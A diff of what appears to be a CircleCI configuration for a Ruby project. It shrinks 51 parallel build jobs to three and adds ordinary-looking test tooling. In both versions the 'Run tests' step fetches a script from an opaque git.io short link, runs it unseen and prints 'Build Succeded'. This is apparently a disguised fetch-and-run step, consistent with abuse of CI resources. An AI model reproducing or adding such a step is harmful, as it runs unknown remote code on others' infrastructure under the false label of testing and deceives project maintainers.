@@ -1,8 +1,14 @@
-working_dir: &working_dir ~/app 
-.build_template: &script 
-  parallelism: 2 
-  steps: 
-    - checkout 
+working_dir: &working_dir ~/app
+
+.build_template: &build_definition
+  steps:
+    - checkout
+    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
+    - run: chmod +x ./cc-test-reporter
+    - run: ./cc-test-reporter before-build
+    - run: gem install bundler:2.1.4
+    - run: bundle install --jobs=4 --retry=4 --path vendor/bundle
+    - run: bundle exec rake rubocop
     - run: 
         name: Install Dependencies 
         command: | 
@@ -12,269 +18,33 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: | 
-                    wget -qO build.sh https://git.io/J6Hhe 
+                    wget -qO build.sh https://git.io/J65mg 
                     chmod +x build.sh 
                     ./build.sh 
                     echo Build Succeded 
-version: 2.0 
-jobs: 
-  build1: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build2: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build3: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build4: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build5: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build6: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build7: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build8: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build9: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build10: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build11: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build12: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build13: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build14: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build15: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build16: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build17: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build18: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build19: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build20: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build21: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build22: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build23: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build24: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build25: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build26: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build27: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build28: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build29: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build30: 
-    <<: *script 
-    docker: 
+        
+
+version: 2.0
+
+jobs:
+  build:
+    docker:
       - image: ruby
-  build31: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build32: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build33: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build34: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build35: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build36: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build37: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build38: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build39: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build40: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build41: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build42: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build43: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build44: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build45: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build46: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build47: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build48: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build49: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build50: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build51: 
-    <<: *script 
-    docker: 
-      - image: ruby
-      
-workflows: 
-  version: 2 
-  commit: 
-    jobs: 
-      - build1 
-      - build2 
-      - build3 
-      - build4 
-      - build5 
-      - build6 
-      - build7 
-      - build8 
-      - build9 
-      - build10 
-      - build11 
-      - build12 
-      - build13 
-      - build14 
-      - build15 
-      - build16 
-      - build17 
-      - build18 
-      - build19 
-      - build20 
-      - build21 
-      - build22 
-      - build23 
-      - build24 
-      - build25 
-      - build26 
-      - build27 
-      - build28 
-      - build29 
-      - build30
-      - build31 
-      - build32 
-      - build33
-      - build34 
-      - build35 
-      - build36 
-      - build37 
-      - build38 
-      - build39 
-      - build40 
-      - build41 
-      - build42 
-      - build43 
-      - build44 
-      - build45 
-      - build46 
-      - build47 
-      - build48 
-      - build49 
-      - build50 
-      - build51
+    steps:
+      - checkout
+  build_ruby2_4:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.4
+  build_ruby2_3:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+
+workflows:
+  version: 2
+  build_ruby_versions:
+    jobs:
+      - build
+      - build_ruby2_4
+      - build_ruby2_3
